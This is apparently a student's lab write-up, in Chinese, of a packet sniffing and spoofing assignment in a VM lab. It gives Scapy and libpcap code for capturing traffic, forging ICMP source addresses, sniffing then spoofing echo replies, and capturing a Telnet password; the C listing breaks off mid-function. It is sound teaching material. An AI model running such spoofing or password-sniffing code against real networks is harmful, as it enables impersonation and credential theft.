    <content type="html"><![CDATA[<h1 id="Packet-Sniffing-lab"><a href="#Packet-Sniffing-lab" class="headerlink" title="Packet Sniffing lab"></a>Packet Sniffing lab</h1><p>[TOC]</p><h3 id="Task-1-1-Sniffing-Packets"><a href="#Task-1-1-Sniffing-Packets" class="headerlink" title="Task 1.1: Sniffing Packets"></a>Task 1.1: Sniffing Packets</h3><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_pkt</span><span class="hljs-params">(pkt)</span>:</span>pkt.show()pkt = sniff(filter=<span class="hljs-string">'icmp'</span>,prn=print_pkt)</code></pre><p>运行截图</p><p><img src="/2020/10/02/Web-Security-lab1/task1.1A.PNG" srcset="/img/loading.gif" alt="task1.1A"></p><p>打开wireshark，进行抓包</p><p><img src="/2020/10/02/Web-Security-lab1/task1.1A_1.PNG" srcset="/img/loading.gif" alt="task1.1A_1"></p><p>发现确实抓到了数据包</p><p>之后我们如果不用root权限的话，直接./sniffer.py进行运行，此时</p><p><img src="/2020/10/02/Web-Security-lab1/task1.1.PNG" srcset="/img/loading.gif" alt="task1.1"></p><p>抓取ICMP的包</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_pkt</span><span class="hljs-params">(pkt)</span>:</span>pkt.show()pkt = sniff(filter=<span class="hljs-string">'icmp'</span>,prn=print_pkt)</code></pre><p>抓取对应主机以及端口的数据包</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_pkt</span><span class="hljs-params">(pkt)</span>:</span>pkt.show()pkt = sniff(filter=<span class="hljs-string">'src host 182.61.200.6 and dst port 23'</span>,prn=print_pkt)</code></pre><p>抓取对应子网的包</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_pkt</span><span class="hljs-params">(pkt)</span>:</span>pkt.show()pkt = sniff(filter=<span class="hljs-string">'host 128.230.0.0/16'</span>,prn=print_pkt)</code></pre><h3 id="Task-1-2-Spoofing-ICMP-Packets"><a href="#Task-1-2-Spoofing-ICMP-Packets" class="headerlink" title="Task 1.2: Spoofing ICMP Packets"></a>Task 1.2: Spoofing ICMP Packets</h3><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; from scapy.all import *<span class="hljs-meta">&gt;&gt;</span>&gt; a = IP() <span class="hljs-meta">&gt;&gt;</span>&gt; a.src = ’<span class="hljs-number">10.0</span>.<span class="hljs-number">2.3</span>’ <span class="hljs-meta">&gt;&gt;</span>&gt; b = ICMP() <span class="hljs-meta">&gt;&gt;</span>&gt; p = a/b <span class="hljs-meta">&gt;&gt;</span>&gt; send(p)</code></pre><p>在原来的code基础上将a.dst改为a.src就可以伪造任意分配的IP源地址，此时运行ls（a），会出现：</p><pre><code class="hljs yaml"><span class="hljs-string">&gt;&gt;&gt;</span> <span class="hljs-string">ls(a)</span><span class="hljs-attr">version    :</span> <span class="hljs-string">BitField</span>  <span class="hljs-string">(4</span> <span class="hljs-string">bits)</span>                  <span class="hljs-string">=</span> <span class="hljs-number">4</span>               <span class="hljs-string">(4)</span><span class="hljs-attr">ihl        :</span> <span class="hljs-string">BitField</span>  <span class="hljs-string">(4</span> <span class="hljs-string">bits)</span>                  <span class="hljs-string">=</span> <span class="hljs-string">None</span>            <span class="hljs-string">(None)</span><span class="hljs-attr">tos        :</span> <span class="hljs-string">XByteField</span>                          <span class="hljs-string">=</span> <span class="hljs-number">0</span>               <span class="hljs-string">(0)</span><span class="hljs-attr">len        :</span> <span class="hljs-string">ShortField</span>                          <span class="hljs-string">=</span> <span class="hljs-string">None</span>            <span class="hljs-string">(None)</span><span class="hljs-attr">id         :</span> <span class="hljs-string">ShortField</span>                          <span class="hljs-string">=</span> <span class="hljs-number">1</span>               <span class="hljs-string">(1)</span><span class="hljs-attr">flags      :</span> <span class="hljs-string">FlagsField</span>  <span class="hljs-string">(3</span> <span class="hljs-string">bits)</span>                <span class="hljs-string">=</span> <span class="hljs-string">&lt;Flag</span> <span class="hljs-number">0</span> <span class="hljs-string">()&gt;</span>     <span class="hljs-string">(&lt;Flag</span> <span class="hljs-number">0</span> <span class="hljs-string">()&gt;)</span><span class="hljs-attr">frag       :</span> <span class="hljs-string">BitField</span>  <span class="hljs-string">(13</span> <span class="hljs-string">bits)</span>                 <span class="hljs-string">=</span> <span class="hljs-number">0</span>               <span class="hljs-string">(0)</span><span class="hljs-attr">ttl        :</span> <span class="hljs-string">ByteField</span>                           <span class="hljs-string">=</span> <span class="hljs-number">64</span>              <span class="hljs-string">(64)</span><span class="hljs-attr">proto      :</span> <span class="hljs-string">ByteEnumField</span>                       <span class="hljs-string">=</span> <span class="hljs-number">0</span>               <span class="hljs-string">(0)</span><span class="hljs-attr">chksum     :</span> <span class="hljs-string">XShortField</span>                         <span class="hljs-string">=</span> <span class="hljs-string">None</span>            <span class="hljs-string">(None)</span><span class="hljs-attr">src        :</span> <span class="hljs-string">SourceIPField</span>                       <span class="hljs-string">=</span> <span class="hljs-string">'10.0.2.3'</span>      <span class="hljs-string">(None)</span><span class="hljs-attr">dst        :</span> <span class="hljs-string">DestIPField</span>                         <span class="hljs-string">=</span> <span class="hljs-string">'127.0.0.1'</span>     <span class="hljs-string">(None)</span><span class="hljs-attr">options    :</span> <span class="hljs-string">PacketListField</span>                     <span class="hljs-string">=</span> <span class="hljs-string">[]</span>              <span class="hljs-string">([])</span></code></pre><h3 id="Task-1-3-Traceroute"><a href="#Task-1-3-Traceroute" class="headerlink" title="Task 1.3: Traceroute"></a>Task 1.3: Traceroute</h3><p>提供的code</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; a = IP()<span class="hljs-meta">&gt;&gt;</span>&gt; a.dst = ’<span class="hljs-number">1.2</span>.<span class="hljs-number">3.4</span>’<span class="hljs-meta">&gt;&gt;</span>&gt; a.ttl = <span class="hljs-number">3</span><span class="hljs-meta">&gt;&gt;</span>&gt; b = ICMP()<span class="hljs-meta">&gt;&gt;</span>&gt; send(a/b)</code></pre><p>在这一步中可以采用笨方法，直接是一个一个修改TTL</p><p>同时，在这一步中，由于之前对于ICMP协议的一些东西忘记，参考了一些博文，mark一下</p><p><a href="https://blog.csdn.net/qq_35733751/article/details/80053091?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160181088219195246651245%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160181088219195246651245&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-1-80053091.pc_first_rank_v2_rank_v28&utm_term=icmp%E8%B6%85%E6%97%B6%E6%8A%A5%E6%96%87&spm=1018.2118.3001.4187" target="_blank" rel="noopener">ICMP差错报告报文</a></p><pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-built_in">from</span> scapy.all import *<span class="hljs-keyword">a</span> = IP()<span class="hljs-keyword">a</span>.dst = <span class="hljs-string">'1.2.3.4'</span><span class="hljs-keyword">a</span>.ttl = <span class="hljs-number">10</span>b = ICMP()<span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span>.ttl &gt;= <span class="hljs-number">0</span>:<span class="hljs-keyword">a</span>.ttl = <span class="hljs-keyword">a</span>.ttl - <span class="hljs-number">1</span><span class="hljs-built_in">send</span>(<span class="hljs-keyword">a</span>/b)</code></pre><p>之后在terminal和wireshark里面分别运行以及抓包</p><p><img src="/2020/10/02/Web-Security-lab1/task1.4.PNG" srcset="/img/loading.gif" alt="task1.4"></p><p><img src="/2020/10/02/Web-Security-lab1/task1.4.2.PNG" srcset="/img/loading.gif" alt="task1.4.2"></p><p>可以看到发送成功，并且ttl发生变化</p><h3 id="Task-1-4-Sniffing-and-then-Spoofing"><a href="#Task-1-4-Sniffing-and-then-Spoofing" class="headerlink" title="Task 1.4: Sniffing and-then Spoofing"></a>Task 1.4: Sniffing and-then Spoofing</h3><p>在这里，这个task的具体要求是：</p><ol><li>VM A要去ping一个IP为X的端系统，但是不知道X是否是alive状态，并且我们通过在VM A上的wireshark可以来截取包</li><li>VM B来对于所有数据包进行嗅探，当它发现目的IP为X的数据包的时候，利用spoofing来伪造一个IP为X的response报文</li></ol><p>在这里我选择让A去ping百度的IP地址，即X为182.61.200.6，所以在B中的sniffing&amp;spoofing的code如下：（A是10.0.2.4；B是10.0.2.6）</p><pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-built_in">from</span> scapy.all import *def spoof_pkt(pkt):    <span class="hljs-keyword">a</span> = IP()     b = ICMP()      <span class="hljs-keyword">a</span>.dst = <span class="hljs-string">'10.0.2.4'</span>    <span class="hljs-keyword">a</span>.src = <span class="hljs-string">'182.61.200.6'</span>    <span class="hljs-built_in">send</span>(<span class="hljs-keyword">a</span> / b) pkt = sniff(<span class="hljs-built_in">filter</span>=<span class="hljs-string">'icmp and host 10.0.2.4'</span>, prn=spoof_pkt)</code></pre><p>修改权限并运行py文件，在测试的时候我为了能够看出是否是B发送过来的，就没有把src的IP进行修改，即没写a.src那一行</p><p>之后在B机器上运行wireshark来获取包的内容</p><p><img src="/2020/10/02/Web-Security-lab1/lab1_task1.4.PNG" srcset="/img/loading.gif" alt="lab1_task1.4"></p><p>可以看到在没有spoofing的数据包中，仅仅是将数据包返回，通过测试</p><p>整个运行后：</p><p><img src="/2020/10/02/Web-Security-lab1/lab1_task1.4_2.PNG" srcset="/img/loading.gif" alt="lab1_task1.4_2"></p><p>完成！！！</p><h2 id="Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="Task Set 2: Writing Programs to Sniff and Spoof Packets"></a>Task Set 2: Writing Programs to Sniff and Spoof Packets</h2><h3 id="Task-2-1-Writing-Packet-Sniffing-Program"><a href="#Task-2-1-Writing-Packet-Sniffing-Program" class="headerlink" title="Task 2.1: Writing Packet Sniffing Program"></a>Task 2.1: Writing Packet Sniffing Program</h3><p>将给出的code试运行并且进行分析后，先来看需要回答的问题</p><ol><li><p>Q：Please use your own words to describe the sequence of the library calls that are essential for sniffer programs. This is meant to be a summary, not detailed explanation like the one in the tutorial or book.</p><p> A：第一步，配置机器</p><blockquote><p>在这一步中，我们首先需要的是知道我们所要sniff on的接口的名称，在sample code中，我们采用的是pacp_lookupdev函数来进行自动获取</p></blockquote><p> ​      第二步，打开设备来进行嗅探</p><blockquote><p>在第二部的时候，我们需要创建一个嗅探会话，通过使用pcap_open_live来进行使用，其中第一个参数表示我们刚刚打开的设备的接口名称，第二个表示我们能够读取的最大字数，第三个表示模式（混杂模式置为true，非混杂置为false），to_ms表示读取超时，以毫秒为单位，最后的可作为错误信息的存储</p></blockquote><p> ​      第三步，过滤流量</p><blockquote><p>我们并不是对于所有端口的流量都感兴趣，通常情况下，只关心特定端口的流量情况，在这一步我们分为了两个步骤，首先是对于过滤器的“compile”过程，使用的是pcap_compile函数，这个函数返回值为-1时表示false，其他都表示成功</p><p>接下来我们要进行的时对于过滤器的应用，是pcap_setfilter函数</p></blockquote><p> ​      第四步，实际嗅探</p><blockquote><p>在这里，有两种进行获取数据包的方式，一种是利用pcap_next（）但是缺点是没有办法进行批量处理，另一种的是利用回调函数，回调函数就是每次我都会进行一个调用的函数，比如在等待用户在键盘上输入一个字符，之后我需要调用一个函数，这个函数定义了要执行的操作，之后一般我们采用pcap_loop()函数来进行抓包</p></blockquote><p> ​      第五步，关闭会话</p></li></ol><p>之后在写完并且试运行sniff的code，下面是我所获取的结果</p><p><img src="/2020/10/02/Web-Security-lab1/lab1_task2.1A.PNG" srcset="/img/loading.gif" alt="lab1_task2.1A"></p><p>其中我们可以在From和To的后面来获得对应的IP地址，同时如果不给予root权限就进行运行，会出现segmentation fault</p><p><img src="/2020/10/02/Web-Security-lab1/lab1_task2.1A_2.PNG" srcset="/img/loading.gif" alt="lab1_task2.1A_2"></p><ol start="2"><li><p>Q：Why do you need the root privilege to run a sniffer program? Where does the program fail if it is executed without the root privilege?</p><p> A：因为我们需要root权限来打开一个sniffing会话，会卡在pcap_open_live（）这里</p></li><li><p>Q：Please turn on and turn off the promiscuous mode in your sniffer program. Can you demonstrate the difference when this mode is on and off? Please describe how you can demonstrate this.</p><p> A：首先是打开（即混杂模式为true）的状态</p><p> <img src="/2020/10/02/Web-Security-lab1/task2.1_3.PNG" srcset="/img/loading.gif" alt="task2.1_3"></p><p> 此时可以看到即便发出ping命令的并不是这台虚拟机，但是由于sniff的VM和发出ping的VM在一个网络中，仍然会收到数据包（），但是如果将混杂模式参数置为0，那么就只会接收到sniff的VM的收和发的数据包，而不会接收pass through的数据包</p><p> <img src="/2020/10/02/Web-Security-lab1/task2.1_3_3.PNG" srcset="/img/loading.gif" alt="task2.1_3_3"></p><p> <img src="/2020/10/02/Web-Security-lab1/task2.1_3_2.PNG" srcset="/img/loading.gif" alt="task2.1_3_2"></p><h4 id="Task-2-1B-Writing-Filters"><a href="#Task-2-1B-Writing-Filters" class="headerlink" title="Task 2.1B: Writing Filters"></a>Task 2.1B: Writing Filters</h4><ol><li><p>首先是ICMP的数据包，将filter_exp进行修改即可</p><p> <img src="/2020/10/02/Web-Security-lab1/task2.1_4.PNG" srcset="/img/loading.gif" alt="task2.1_4"></p><p>​    编译后进行运行，并且在10.0.2.6这台VM上ping 10.0.2.4</p><p><img src="/2020/10/02/Web-Security-lab1/task2.1_4_2.PNG" srcset="/img/loading.gif" alt="task2.1_4_2"></p></li><li><p>其次是捕获tcp包</p><p> <img src="/2020/10/02/Web-Security-lab1/task2.1B.PNG" srcset="/img/loading.gif" alt="task2.1B"></p><p>​    </p><p>​        之后编译运行，在另一台VM上运行talnet <a href="http://www.baidu.com命令" target="_blank" rel="noopener">www.baidu.com命令</a></p><p><img src="/2020/10/02/Web-Security-lab1/task2.1_b_2.PNG" srcset="/img/loading.gif" alt="task2.1_b_2"></p><h4 id="Task-2-1C-Sniffing-Passwords"><a href="#Task-2-1C-Sniffing-Passwords" class="headerlink" title="Task 2.1C: Sniffing Passwords."></a>Task 2.1C: Sniffing Passwords.</h4><p><img src="/2020/10/02/Web-Security-lab1/task2.1_c.PNG" srcset="/img/loading.gif" alt="task2.1_c"></p><p><img src="/2020/10/02/Web-Security-lab1/task2.1_c_2.PNG" srcset="/img/loading.gif" alt="task2.1_c_2"></p><p><img src="/2020/10/02/Web-Security-lab1/task2.1_c_3.PNG" srcset="/img/loading.gif" alt="task2.1_c_3"></p><p>受篇幅所限，打印出来的完整password是dees</p></li></ol></li></ol><h3 id="Task-2-2-Spoofing"><a href="#Task-2-2-Spoofing" class="headerlink" title="Task 2.2: Spoofing"></a>Task 2.2: Spoofing</h3><p><img src="/2020/10/02/Web-Security-lab1/task2.2_2.PNG" srcset="/img/loading.gif" alt="task2.2_2"></p><p>运行截图：</p><p><img src="/2020/10/02/Web-Security-lab1/task2.2_1.PNG" srcset="/img/loading.gif" alt="task2.2_1"></p><h4 id="Task-2-2B-Spoof-an-ICMP-Echo-Request"><a href="#Task-2-2B-Spoof-an-ICMP-Echo-Request" class="headerlink" title="Task 2.2B: Spoof an ICMP Echo Request."></a>Task 2.2B: Spoof an ICMP Echo Request.</h4><p>之后依旧采用这个方法，来对ICMP进行构造，通过第一次运行并用wireshark来进行看ICMP的checksum的值，修改后再次进行运行，可以得到echo reply</p><p><img src="/2020/10/02/Web-Security-lab1/task2.2_3.PNG" srcset="/img/loading.gif" alt="task2.2_3">)<img src="/2020/10/02/Web-Security-lab1/task2.2-4.PNG" srcset="/img/loading.gif" alt="task2.2-4"></p><p>下面对于问题进行回答</p><ol start="4"><li><p>Q:Can you set the IP packet length field to an arbitrary value, regardless of how big the actual packet is?</p><p> A:经过实验，可以发现当我们修改IP首部长度的时候，会在wireshark里面显示错误，但是如果是修改数据包长度的话，在wireshark并没有出现报错</p></li><li><p>Q:Using the raw socket programming, do you have to calculate the checksum for the IP header?</p><p> A:并不需要计算IP头部的首部校验和，因为在IP头部上TTL可能会发生改变，此时校验和也会随之发生改变</p></li><li><p>Q:Why do you need the root privilege to run the programs that use raw sockets? Where does the program fail if executed without the root privilege?</p></li></ol><h3 id="Task-2-3-Sniff-and-then-Spoof"><a href="#Task-2-3-Sniff-and-then-Spoof" class="headerlink" title="Task 2.3: Sniff and then Spoof"></a>Task 2.3: Sniff and then Spoof</h3><p>要求：VM A要ping X，这个会产生一个ICMP的echo request报文，之后在VM B上面运行sniff_spoof程序，来检测此时的网络，当它sniff到一个echo request 报文之后，无论报文的的目的IP是什么，都立刻进行伪造一个echo reply报文，其中，echo reply报文的目的IP为A的IP，源IP为X的IP</p><p>下面是sniff_and_spoof.c的code</p><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pcap.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span><span class="hljs-comment">/* Ethernet addresses are 6 bytes */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ETHER_ADDR_LEN6</span><span class="hljs-comment">/* Ethernet header */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sniff_ethernet</span> &#123;</span>        u_char  ether_dhost[ETHER_ADDR_LEN];    <span class="hljs-comment">/* destination host address */</span>        u_char  ether_shost[ETHER_ADDR_LEN];    <span class="hljs-comment">/* source host address */</span>        u_short ether_type;                     <span class="hljs-comment">/* IP? ARP? RARP? etc */</span>&#125;;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sniff_ip</span> &#123;</span>        u_char  ip_vhl;                 <span class="hljs-comment">/* version &lt;&lt; 4 | header length &gt;&gt; 2 */</span>        u_char  ip_tos;                 <span class="hljs-comment">/* type of service */</span>        u_short ip_len;                 <span class="hljs-comment">/* total length */</span>        u_short ip_id;                  <span class="hljs-comment">/* identification */</span>        u_short ip_off;                 <span class="hljs-comment">/* fragment offset field */</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IP_RF 0x8000            <span class="hljs-comment">/* reserved fragment flag */</span></span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IP_DF 0x4000            <span class="hljs-comment">/* dont fragment flag */</span></span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IP_MF 0x2000            <span class="hljs-comment">/* more fragments flag */</span></span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IP_OFFMASK 0x1fff       <span class="hljs-comment">/* mask for fragmenting bits */</span></span>        u_char  ip_ttl;                 <span class="hljs-comment">/* time to live */</span>        u_char  ip_p;                   <span class="hljs-comment">/* protocol */</span>        u_short ip_sum;                 <span class="hljs-comment">/* checksum */</span>        <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span> <span class="hljs-title">ip_src</span>,<span class="hljs-title">ip_dst</span>;</span>  <span class="hljs-comment">/* source and dest address */</span>&#125;;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IP_HL(ip)               (((ip)-&gt;ip_vhl) &amp; 0x0f)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IP_V(ip)                (((ip)-&gt;ip_vhl) &gt;&gt; 4)</span><span class="hljs-comment">/* TCP header */</span><span class="hljs-keyword">typedef</span> u_int tcp_seq;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sniff_tcp</span> &#123;</span>        u_short th_sport;               <span class="hljs-comment">/* source port */</span>        u_short th_dport;               <span class="hljs-comment">/* destination port */</span>        tcp_seq th_seq;                 <span class="hljs-comment">/* sequence number */</span>        tcp_seq th_ack;                 <span class="hljs-comment">/* acknowledgement number */</span>        u_char  th_offx2;               <span class="hljs-comment">/* data offset, rsvd */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_OFF(th)      (((th)-&gt;th_offx2 &amp; 0xf0) &gt;&gt; 4)</span>        u_char  th_flags;        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_FIN  0x01</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_SYN  0x02</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_RST  0x04</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_PUSH 0x08</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_ACK  0x10</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_URG  0x20</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_ECE  0x40</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_CWR  0x80</span>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span>        u_short th_win;                 <span class="hljs-comment">/* window */</span>        u_short th_sum;                 <span class="hljs-comment">/* checksum */</span>        u_short th_urp;                 <span class="hljs-comment">/* urgent pointer */</span>&#125;;<span class="hljs-comment">/* ethernet headers are always exactly 14 bytes */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_ETHERNET 14</span><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sniff_ethernet</span> *<span class="hljs-title">ethernet</span>;</span> <span class="hljs-comment">/* The ethernet header */</span><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sniff_ip</span> *<span class="hljs-title">ip</span>;</span> <span class="hljs-comment">/* The IP header */</span><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sniff_tcp</span> *<span class="hljs-title">tcp</span>;</span> <span class="hljs-comment">/* The TCP header */</span><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *payload; <span class="hljs-comment">/* Packet payload */</span>u_int size_ip;u_int size_tcp;    u_int size_payload;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insertip</span><span class="hljs-params">(struct in_addr addrip, <span class="hljs-keyword">char</span> *<span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">int</span> addr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *ip;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> intip;    <span class="hljs-built_in">memcpy</span>(&amp;intip, &amp;addrip, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>));    <span class="hljs-keyword">int</span> a = (intip &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span>;    <span class="hljs-keyword">int</span> b = (intip &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>;    <span class="hljs-keyword">int</span> c = (intip &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>;    <span class="hljs-keyword">int</span> d = intip &amp; <span class="hljs-number">0xff</span>;    <span class="hljs-keyword">char</span> a1 = a;    <span class="hljs-keyword">char</span> b1 = b;    <span class="hljs-keyword">char</span> c1 = c;    <span class="hljs-keyword">char</span> d1 = d;    <span class="hljs-built_in">strncpy</span>(&amp;<span class="hljs-built_in">buffer</span>[addr], &amp;d1, <span class="hljs-number">1</span>);    <span class="hljs-built_in">strncpy</span>(&amp;<span class="hljs-built_in">buffer</span>[addr + <span class="hljs-number">1</span>], &amp;c1, <span class="hljs-number">1</span>);    <span class="hljs-built_in">strncpy</span>(&amp;<span class="hljs-built_in">buffer</span>[addr + <span class="hljs-number">2</span>], &amp;b1, <span class="hljs-number">1</span>);    <span class="hljs-built_in">strncpy</span>(&amp;<span class="hljs-built_in">buffer</span>[addr + <span class="hljs-number">3</span>], &amp;a1, <span class="hljs-number">1</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_hex_ascii_line</span><span class="hljs-params">(<span class="hljs-keyword">const</span> u_char *payload, <span class="hljs-keyword">int</span> len, <span class="hljs-keyword">int</span> offset)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> i;<span class="hljs-keyword">int</span> gap;<span class="hljs-keyword">const</span> u_char *ch;<span class="hljs-comment">/* offset */</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"%05d   "</span>, offset);<span class="hljs-comment">/* hex */</span>ch = payload;<span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02x "</span>, *ch);ch++;<span class="hljs-comment">/* print extra space after 8th byte for visual aid */</span><span class="hljs-keyword">if</span> (i == <span class="hljs-number">7</span>)<span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);&#125;<span class="hljs-comment">/* print space to handle line less than 8 bytes */</span><span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">8</span>)<span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<span class="hljs-comment">/* fill hex gap with spaces if not full line */</span><span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">16</span>) &#123;gap = <span class="hljs-number">16</span> - len;<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; gap; i++) &#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"   "</span>);&#125;&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"   "</span>);<span class="hljs-comment">/* ascii (if printable) */</span>ch = payload;<span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isprint</span>(*ch))<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, *ch);<span class="hljs-keyword">else</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"."</span>);ch++;&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);    <span class="hljs-keyword">return</span>;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment"> * print packet payload data (avoid printing binary data)</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_payload</span><span class="hljs-params">(<span class="hljs-keyword">const</span> u_char *payload, <span class="hljs-keyword">int</span> len)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> len_rem = len;<span class="hljs-keyword">int</span> line_width = <span class="hljs-number">16</span>;<span class="hljs-comment">/* number of bytes per line */</span><span class="hljs-keyword">int</span> line_len;<span class="hljs-keyword">int</span> offset = <span class="hljs-number">0</span>;<span class="hljs-comment">/* zero-based offset counter */</span><span class="hljs-keyword">const</span> u_char *ch = payload;<span class="hljs-keyword">if</span> (len &lt;= <span class="hljs-number">0</span>)<span class="hljs-keyword">return</span>;<span class="hljs-comment">/* data fits on one line */</span><span class="hljs-keyword">if</span> (len &lt;= line_width) &#123;print_hex_ascii_line(ch, len, offset);<span class="hljs-keyword">return</span>;&#125;<span class="hljs-comment">/* data spans multiple lines */</span><span class="hljs-keyword">for</span> ( ;; ) &#123;<span class="hljs-comment">/* compute current line length */</span>line_len = line_width % len_rem;<span class="hljs-comment">/* print line */</span>print_hex_ascii_line(ch, line_len, offset);<span class="hljs-comment">/* compute total remaining */</span>len_rem = len_rem - line_len;<span class="hljs-comment">/* shift pointer to remaining bytes to print */</span>ch = ch + line_len;<span class="hljs-comment">/* add offset */</span>offset = offset + line_width;<span class="hljs-comment">/* check if we have line width chars or less */</span><span class="hljs-keyword">if</span> (len_rem &lt;= line_width) &#123;<span class="hljs-comment">/* print last line and get out */</span>print_hex_ascii_line(ch, len_rem, offset);<span class="hljs-keyword">break</span>;&#125;&#125;    <span class="hljs-keyword">return</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">got_packet</span><span class="hljs-params">(u_char *args, <span class="hljs-keyword">const</span> struct pcap_pkthdr *header, <span class="hljs-keyword">const</span> u_char *packet)</span></span><span 